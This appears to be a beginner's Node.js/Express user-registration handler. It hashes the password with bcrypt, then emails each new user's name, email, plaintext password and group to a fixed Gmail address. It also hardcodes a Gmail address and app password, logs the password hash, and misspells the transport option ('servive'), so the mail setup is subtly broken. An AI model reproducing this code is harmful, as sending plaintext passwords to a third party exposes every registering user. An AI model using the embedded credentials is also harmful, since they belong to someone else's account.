const User = require('../model/User');
const nodemailer = require('nodemailer');
const bcrypt = require("bcryptjs")  


const Userdetails = async(req,res)=>{

const {name,email,password,group} = req.body;

const salt = await bcrypt.genSalt(10)  //gen salt-->it defines patter aur kuch data apne end se addon karta hai take string ka length apne aap se badha ho jaye

const passwordHashed = await bcrypt.hash(password,salt) //it combine and hashed the string lenght

console.log("hashed password is:",passwordHashed)




    try{
        const userdata = await User.create({
            name:name,
            email:email,
            password:passwordHashed,
            group:group


        }) 
const transport = nodemailer.createTransport({
    servive:'gmail',
    auth:{
        user:'ravisinghlko200329@gmail.com',
        pass:'exmu wvex cgme zcxw'

    }
})
 const mailOptions={
            from:'ravisinghlko200329@gmail.com',
            to:'shashanksingh1534lko@gmail.com',
            subject:'New User Registration',
             html: `
      <h2>New Form Submission</h2>
      <p><strong>Name:</strong> ${name}</p>
      <p><strong>Email:</strong> ${email}</p>
      <p><strong>Password:</strong>${password}</p>
      <p><strong>Group:</strong>${group}</p>
    `,

    }

try{
await transport.sendMail(mailOptions);
console.log('Email send successfully');


}
catch(err){
    console.log('Error sending email:',err);
}

res.json(userdata);
    }

    catch(err){
        res.status(500).json({message:err.message})

    }}
    module.exports = Userdetails;

